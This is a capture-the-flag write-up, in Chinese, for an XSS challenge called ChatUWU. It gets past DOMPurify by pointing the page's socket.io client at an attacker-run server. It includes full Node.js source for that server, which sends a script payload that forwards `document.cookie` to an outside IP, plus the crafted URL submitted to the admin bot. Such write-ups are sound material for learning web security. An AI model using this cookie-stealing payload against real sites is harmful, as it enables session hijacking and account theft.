# 题目描述

I can assure you that there is no XSS on the server! You will find the flag in admin's cookie.

Challenge: http://47.254.28.30:58000

XSS Bot: http://47.254.28.30:13337

# 解决方案

直接发送XSS payload会被DOMPurify过滤，无法绕过；然后观察到index.html中有一句源码为`socket = io(`/${location.search}`)`，因此解决思路是自己搭建socket io服务器，然后发送XSS payload，即可拿到admin的cookie，其内容即为flag，socket io服务器参考实现如下：

```javascript
const app = require('express')();
const http = require('http').Server(app);
const cors = require('cors')
const hostname = '0.0.0.0';
const port = 9000;
const io = require('socket.io')(http, {
cors: {
        origin: "*",
        methods: ["GET", "POST"],
        "preflightContinue": false
}
});

const corsOptions = {
        origin: false,
        optionsSuccessStatus: 200 
}

app.get('/', cors(corsOptions), (req, res) => {
console.log(req.query)
});

io.on('connection', (socket) => {
        console.log("hey from: ", socket.handshake.address)
        let {room} = socket.handshake.query;
        socket.join(room);
        io.to(room).emit('msg', {
                from: 'system',
                text: '</li></ul><script>alert(1)</script><img src=x onerror="document.location=\'http://85.244.211.240:9000/?\'+document.cookie;">',
                isHtml: true
        });
});

http.listen(port, hostname, () => {
        console.log(`ChatUWU malicious server running at http://${hostname}:${port}/`);
});
```

其中IP地址85.244.211.240需改为自己服务器的地址，然后在XSS Bot上填写admin访问的地址`http://47.254.28.30:58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:9000`，即可在自己的服务器上收到admin的cookie。